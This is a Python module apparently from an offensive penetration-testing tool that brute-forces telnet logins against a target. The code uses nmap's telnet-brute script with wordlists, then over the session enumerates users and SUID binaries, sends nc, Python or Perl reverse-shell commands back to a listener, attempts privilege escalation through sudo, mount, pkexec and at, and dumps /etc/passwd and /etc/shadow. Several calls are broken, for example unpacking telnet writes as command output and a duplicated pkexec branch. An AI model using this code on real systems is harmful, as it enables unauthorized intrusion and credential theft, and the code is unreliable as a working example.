from termcolor import colored
import re
import uuid
import telnetlib
from helper.questions import telnet_question
from helper.commands import FIND_SUID_BINARIES, FIND_USERS, FIND_USEFUL_BINARIES, FIND_AVAILABLE_COMPILERS
import socket
import re
from PyInquirer.prompt import prompt
from reverse_shell import communicate, setup_server, nc_reverse_shell_cmds, python_reverse_shell_cmds, perl_reverse_shell_cmds
from password import credential_scan
from utils import find_suid_binaries, check_useful_binaries


def telnet_connect(ip, port, username, password):
    password = password
    tn = telnetlib.Telnet(ip)
    tn.read_until(b"login: ")
    tn.write(username.encode('ascii') + b"\n")
    if password:
        tn.read_until(b"Password: ")
        tn.write(password.encode('ascii') + b"\n")
    print(colored('\n' + 'Telnet connected.', attrs=['bold']))
    print('\n----------------------------------------------------\n')
    nextQuestion = True
    while nextQuestion:
        answer = prompt(telnet_question()).get('scan')
        executedCommand = ""
        if answer == 'user list':
            executedCommand = FIND_USERS
            tn.write(FIND_USERS.encode() + b'\n')
        elif answer == 'suid binaries':
            executedCommand = FIND_SUID_BINARIES
            tn.write(FIND_SUID_BINARIES.encode() + b'\n')
        elif answer == 'useful binaries':
            executedCommand = FIND_USEFUL_BINARIES
            tn.write(FIND_USEFUL_BINARIES.encode() + b'\n')
        elif answer == 'available compilers':
            tn.write(FIND_AVAILABLE_COMPILERS.encode() + b'\n')
        elif answer == 'reverse shell':
            stdin, stdout, stderr = tn.write(FIND_USEFUL_BINARIES.encode() + b'\n')
            outlines = stdout.readlines()
            useful_binaries = []
            if len(outlines) > 0:
                ip = '0.0.0.0'
                port = 5559
                server = setup_server(ip, port)
                local_ip = socket.gethostbyname_ex(socket.gethostname())[-1][0]
                for binary in outlines:
                    if 'not found' not in binary:
                        useful_binaries.append(binary.replace('\n', ''))
                
                cmds = []

                for binary in useful_binaries:
                    if 'nc' in binary or 'netcat' in binary:
                        cmds = nc_reverse_shell_cmds(local_ip, port) 
                        break
                    elif 'python' in binary:
                        cmds = python_reverse_shell_cmds(local_ip, port)
                        break
                    elif 'perl' in binary:
                        cmds = perl_reverse_shell_cmds(local_ip, port)
                        break
                
                for cmd in cmds:
                    tn.write(cmd)
                    communicate(server)
                    break
        elif answer == 'available credentials':
            stdin, stdout, stderr = tn.write(find_suid_binaries(ip))
            outlines = stdout.readlines()
            if len(outlines) > 0:
                for path in outlines:
                    if path == '/usr/bin/sudo':
                        tn.write('sudo su')
                    elif path == '/bin/mount':
                        tn.write(
                            'sudo mount -o bind /bin/sh /bin/mount')
                        tn.write('sudo mount')
                    elif path == '/usr/bin/pkexec':
                        tn.write('sudo pkexec /bin/sh')
                    elif path == '/usr/bin/pkexec':
                        tn.write('COMMAND=id')
                        tn.write('echo "$COMMAND" | at now')
                        tn.write(
                            'sudo echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null')
                etc_password = []
                etc_shadow = []
                stdin, stdout, stderr = tn.write(
                    'sudo cat /etc/passwd')
                etc_password = stdout.readlines()
                stdin, stdout, stderr = tn.write(
                    'sudo cat /etc/shadow')
                etc_shadow = stdout.readlines()
                credential_scan(etc_password, etc_shadow)
                print('\n----------------------------------------------------\n')
        elif answer == 'continue':
            break
        read_until = str(uuid.uuid4())
        tn.write("echo {}".format(read_until).encode()+ b'\n')
        responseForPrint = tn.read_until(read_until.encode()).decode('ascii')
        responseStart = responseForPrint.find(executedCommand)
        #if responseStart >= 0:
        #    responseForPrint = responseForPrint[responseStart+len(executedCommand):]
        #responseEnd = responseForPrint.find(read_until)
        #if responseEnd >= 0:
        #    responseForPrint = responseForPrint[:responseEnd]
        #lastLinebreak = responseForPrint.rindex('\n')
        #if lastLinebreak >= 0:
        #    responseForPrint = responseForPrint[:lastLinebreak]
        print(responseForPrint)
    # tn.write(b"find / -type f -perm -u=s 2>/dev/null\n")
    tn.write(b"exit\n")
    # print(tn.read_all().decode('ascii'))


def get_telnet_access(ip, nmScan):
    if ip == 'localhost':
        ip = '127.0.0.1'
    print(colored('\nGet telnet access:', attrs=['bold']))
    nmScan.scan(
        ip, arguments='-p 23 --script telnet-brute --script-args userdb=./utils/word_lists/users.txt,passdb=./utils/word_lists/passwords.txt')
    result = nmScan[ip]['tcp'][23]['script']['telnet-brute']
    print(result)
    if 'Valid credentials' in result:
        print(colored(result, 'green'))
        valid_credential = re.finditer(r"\w+:\w+", result, re.MULTILINE)
        for match in valid_credential:
            return match.group()
    else:
        print(result)